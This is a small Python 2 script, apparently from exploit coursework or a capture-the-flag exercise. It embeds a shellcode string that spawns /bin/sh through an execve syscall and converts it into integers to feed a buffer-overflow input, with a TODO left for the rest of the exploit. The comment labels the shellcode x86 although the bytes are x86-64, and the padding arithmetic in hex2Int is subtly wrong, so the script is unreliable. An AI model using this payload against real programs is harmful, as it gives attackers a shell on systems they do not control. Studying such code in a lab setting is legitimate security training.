#!/usr/bin/env python2

# x86 shellcode
shellcode='\x48\x83\xEC\x20\x48\x89\xE5\x6A' \
          '\x3B\x58\x48\x31\xFF\x57\x48\xBF' \
          '\x2F\x62\x69\x6E\x2F\x2F\x73\x68' \
          '\x57\x48\x89\xE7\x48\x31\xF6\x56' \
          '\x57\x48\x89\xE6\x48\x31\xD2\x0F\x05'

"""return the integer string that, when interpreted
   as an integer, has the byte value of the given hex string.
   if the hex string is represented by multiple integers (i.e., has more than 4 bytes)
   then separate the integers with the given sep character"""
def hex2Int(hexin, sep = '\n'):
    def convertToStr(input):
        return ("%0.2X" % input)

    result = ""
    l = len(hexin)
    numInts = l / 4
    if (l % 4 != 0):
        hexin = hexin + ('\x00'*(l % 4))
        numInts = numInts + 1
    for x in range(0, numInts):
            reversedEndianWord = hexin[x*4:x*4+4][::-1]
            hstr = "0x" + ''.join(map(convertToStr, map(ord, reversedEndianWord)))
            result = result + str(int(hstr, 16)) + sep
    return result

################ hex2Int Done ###############

# TODO actually generate the other parts of the input necessary to
# execute the buffer overflow, combine it with the shellcode, and print it all

shellcodeInt = hex2Int(shellcode)
print shellcodeInt
